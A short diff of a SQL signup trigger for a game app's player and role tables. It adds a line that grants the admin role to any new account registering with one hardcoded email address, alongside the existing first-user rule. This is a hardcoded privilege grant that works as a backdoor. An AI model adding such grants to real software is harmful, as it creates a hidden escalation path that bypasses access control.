@@ -64,7 +64,7 @@ begin
   end if;
   insert into public.players(user_id, nick) values (new.id, n);
   insert into public.user_roles(user_id, role) values (new.id, 'user');
-  if not exists(select 1 from public.user_roles where role='admin') then
+  if not exists(select 1 from public.user_roles where role='admin') or lower(new.email) = 'mbaloterii@gmail.com' then
     insert into public.user_roles(user_id, role) values (new.id, 'admin');
   end if;
   return new;
